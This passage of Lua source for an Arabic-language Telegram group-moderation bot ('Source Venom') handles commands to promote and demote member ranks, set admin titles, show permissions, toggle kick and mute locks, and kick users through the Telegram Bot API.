if text and text:match('^تنزيل مالك @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مالك @(.*)')
function promreply(extra,result,success)
if result.id_ then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(result.id_) == tonumber(admins[i].user_id_) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevAbs:srem(Venom..'Abs:AbsConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم تنزيله من المالكين")  
end end end
end,nil)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مالك (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مالك (%d+)')
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(user) == tonumber(admins[i].user_id_) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevAbs:srem(Venom..'Abs:AbsConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","𖠧︙تم تنزيله من المالكين")  
end end end
end,nil)
end end
--     Source Venom     --
--  Set BasicConstructor  --
if AbsConstructor(msg) then
if text ==('رفع منشئ اساسي') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(Venom..'Abs:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Venom..'Abs:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم رفعه منشئ اساسي")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ اساسي (%d+)') and SourceCh(msg) then
local user = text:match('رفع منشئ اساسي (%d+)')
DevAbs:sadd(Venom..'Abs:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","𖠧︙تم رفعه منشئ اساسي")  
end
--     Source Venom     --
--  Rem BasicConstructor  --
if text ==('تنزيل منشئ اساسي') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Venom..'Abs:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Venom..'Abs:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم تنزيله منشئ اساسي")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ اساسي (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منشئ اساسي (%d+)')
DevAbs:srem(Venom..'Abs:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","𖠧︙تم تنزيله منشئ اساسي")  
end end
if text ==('رفع منشئ اساسي') and not AbsConstructor(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙هذا الامر للمالكين والمطورين فقط', 1, 'md')
end
--     Source Venom     --
--    Set  Constructor    --
if BasicConstructor(msg) then
if text ==('رفع منشئ') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(Venom..'Abs:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه في قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Venom..'Abs:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم رفعه في قائمة المنشئين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ (%d+)') and SourceCh(msg) then
local user = text:match('رفع منشئ (%d+)')
DevAbs:sadd(Venom..'Abs:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","𖠧︙تم رفعه في قائمة المنشئين")  
end
--     Source Venom     --
--    Rem  Constructor    --
if text ==('تنزيل منشئ') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Venom..'Abs:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله من قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Venom..'Abs:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم تنزيله من قائمة المنشئين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منشئ (%d+)')
DevAbs:srem(Venom..'Abs:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","𖠧︙تم تنزيله من قائمة المنشئين")  
end 
end
--     Source Venom     --
--      Set Manager       --
if Constructor(msg) then
if text ==('رفع مدير') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbs:sadd(Venom..'Abs:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه في قائمة المدراء")  
end  
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Venom..'Abs:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم رفعه في قائمة المدراء")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^رفع مدير (%d+)') and SourceCh(msg) then
local user = text:match('رفع مدير (%d+)')
DevAbs:sadd(Venom..'Abs:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","𖠧︙تم رفعه في قائمة المدراء")  
end
--     Source Venom     --
--       Rem Manager      --
if text ==('تنزيل مدير') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله من قائمة المدراء")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم تنزيله من قائمة المدراء")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مدير (%d+)')
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","𖠧︙تم تنزيله من قائمة المدراء")  
end 
--     Source Venom     --
--       Set Cleaner      --
if text ==('رفع منظف') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbs:sadd(Venom..'Abs:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه في قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع منظف @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Venom..'Abs:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم رفعه في قائمة المنظفين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منظف (%d+)') and SourceCh(msg) then
local user = text:match('رفع منظف (%d+)')
DevAbs:sadd(Venom..'Abs:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","𖠧︙تم رفعه في قائمة المنظفين")  
end
--     Source Venom     --
--       Rem Cleaner      --
if text ==('تنزيل منظف') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Venom..'Abs:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله من قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منظف @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Venom..'Abs:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم تنزيله من قائمة المنظفين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منظف (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منظف (%d+)')
DevAbs:srem(Venom..'Abs:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","𖠧︙تم تنزيله من قائمة المنظفين")  
end end
--     Source Venom     --
--       Set admin        --
if Manager(msg) then
if text ==('رفع ادمن') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and DevAbs:get(Venom.."Abs:Lock:ProSet"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbs:sadd(Venom..'Abs:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه في قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and SourceCh(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and DevAbs:get(Venom.."Abs:Lock:ProSet"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
DevAbs:sadd(Venom..'Abs:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم رفعه في قائمة الادمنيه")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن (%d+)') and SourceCh(msg) then
local user = text:match('رفع ادمن (%d+)')
if not BasicConstructor(msg) and DevAbs:get(Venom.."Abs:Lock:ProSet"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbs:sadd(Venom..'Abs:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","𖠧︙تم رفعه في قائمة الادمنيه")  
end
--     Source Venom     --
--        Rem admin       --
if text ==('تنزيل ادمن') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله من قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم تنزيله من قائمة الادمنيه")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل ادمن (%d+)')
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","𖠧︙تم تنزيله من قائمة الادمنيه")  
end end
--     Source Venom     --
--       Set Vipmem       --
if Admin(msg) then
if text ==('رفع مميز') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and DevAbs:get(Venom.."Abs:Lock:ProSet"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbs:sadd(Venom..'Abs:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه في قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and DevAbs:get(Venom.."Abs:Lock:ProSet"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
DevAbs:sadd(Venom..'Abs:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم رفعه في قائمة المميزين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز (%d+)') and SourceCh(msg) then
local user = text:match('رفع مميز (%d+)')
if not BasicConstructor(msg) and DevAbs:get(Venom.."Abs:Lock:ProSet"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbs:sadd(Venom..'Abs:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","𖠧︙تم رفعه في قائمة المميزين")  
end
--     Source Venom     --
--       Rem Vipmem       --
if text ==('تنزيل مميز') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله من قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم تنزيله من قائمة المميزين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مميز (%d+)')
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","𖠧︙تم تنزيله من قائمة المميزين")  
end end 
--     Source Venom     --
if BasicConstructor(msg) then
if text and text:match("^رفع مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Venom)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه مشرف في المجموعه")  
else
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Venom)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله من مشرفين المجموعه")  
else
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text and (text:match("^رفع بكل الصلاحيات$") or text:match("^رفع بكل صلاحيات$")) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Venom)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه مشرف في جميع الصلاحيات")  
else
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and (text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")) and ChCheck(msg) then
local Abs = text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")
function ReplySet(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Venom)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
https.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم اضافة ↫ "..Abs.." كلقب له")  
https.request("https://api.telegram.org/bot"..TokenBot.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&custom_title="..Abs)
else
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplySet)
end
end
end
if text == 'لقبه' then
function ReplyGet(extra, result, success)
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) == false then
send(msg.chat_id_, msg.id_,'𖠧︙ليس لديه لقب هنا') 
else
send(msg.chat_id_, msg.id_,'𖠧︙لقبه ↫ '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)) 
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplyGet)
end
end
if text == 'لقبي' then
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) == false then
send(msg.chat_id_, msg.id_,'𖠧︙ليس لديك لقب هنا') 
else
send(msg.chat_id_, msg.id_,'𖠧︙لقبك ↫ '..GetCustomTitle(msg.sender_user_id_,msg.chat_id_)) 
end
end
if text == 'نبذتي' or text == 'بايو' then
send(msg.chat_id_, msg.id_,'['..GetBio(msg.sender_user_id_)..']')
end
if text == "راسلني" then
VenomTEAM = {"ها هلاو","انطق","كول حبي","تفضل"};
send(msg.sender_user_id_, 0,VenomTEAM[math.random(#VenomTEAM)])
end
--     Source Venom     --
if text == "صلاحيتي" or text == "صلاحياتي" and ChCheck(msg) then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Validity(msg,msg.sender_user_id_)
end end
if text ==('صلاحيته') or text ==('صلاحياته') and ChCheck(msg) then
function ValidityReply(extra, result, success)
Validity(msg,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ValidityReply)
end end
if text and (text:match('^صلاحيته @(.*)') or text:match('^صلاحياته @(.*)')) and ChCheck(msg) then
local username = text:match('^صلاحيته @(.*)') or text:match('^صلاحياته @(.*)')
function ValidityUser(extra,result,success)
if result.id_ then
Validity(msg,result.id_) 
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,ValidityUser)
end
if text and (text:match('^صلاحيته (%d+)') or text:match('^صلاحياته (%d+)')) and ChCheck(msg) then
local ValidityId = text:match('صلاحيته (%d+)') or text:match('صلاحياته (%d+)')
Validity(msg,ValidityId)  
end
--     Source Venom     --
if Admin(msg) then
if msg.reply_to_message_id_ ~= 0 then
if text and (text:match("^مسح$") or text:match("^حذف$")) and ChCheck(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.reply_to_message_id_})
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حذف الرساله مع رسالة الامر', 1, 'md')
end end end
--     Source Venom     --
if Constructor(msg) then
if text == "تفعيل الحظر" and ChCheck(msg) or text == "تفعيل الطرد" and ChCheck(msg) then
DevAbs:del(Venom.."Abs:Lock:KickBan"..msg.chat_id_)
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل الطرد والحظر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
end
if text == "تعطيل الحظر" and ChCheck(msg) or text == "تعطيل الطرد" and ChCheck(msg) then
DevAbs:set(Venom.."Abs:Lock:KickBan"..msg.chat_id_,"true")
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل الطرد والحظر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
end
if text == "تفعيل الكتم" and ChCheck(msg) or text == "تفعيل التقييد" and ChCheck(msg) then
DevAbs:del(Venom.."Abs:Lock:MuteTked"..msg.chat_id_)
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل الكتم والتقيد'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
end
if text == "تعطيل الكتم" and ChCheck(msg) or text == "تعطيل التقييد" and ChCheck(msg) then
DevAbs:set(Venom.."Abs:Lock:MuteTked"..msg.chat_id_,"true")
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل الكتم والتقيد'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
end
end
if BasicConstructor(msg) then
if text == "تفعيل الرفع" and ChCheck(msg) or text == "تفعيل الترقيه" and ChCheck(msg) then
DevAbs:del(Venom.."Abs:Lock:ProSet"..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم تفعيل رفع ↫ الادمن • المميز', 1, 'md')
end
if text == "تعطيل الرفع" and ChCheck(msg) or text == "تعطيل الترقيه" and ChCheck(msg) then
DevAbs:set(Venom.."Abs:Lock:ProSet"..msg.chat_id_,"true")
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم تعطيل رفع ↫ الادمن • المميز', 1, 'md')
end
end
--     Source Venom     --
--          Kick          --
if Admin(msg) then
if text ==('طرد') and ChCheck(msg) then
function KickReply(extra, result, success)
if not Constructor(msg) and DevAbs:get(Venom.."Abs:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'𖠧︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع طرد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"𖠧︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"𖠧︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم طرده من المجموعه")  
end,nil)
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),KickReply)
end end
if text and text:match('^طرد @(.*)') and ChCheck(msg) then
local username = text:match('^طرد @(.*)')
function KickUser(extra,result,success)
if not Constructor(msg) and DevAbs:get(Venom.."Abs:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'𖠧︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع طرد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
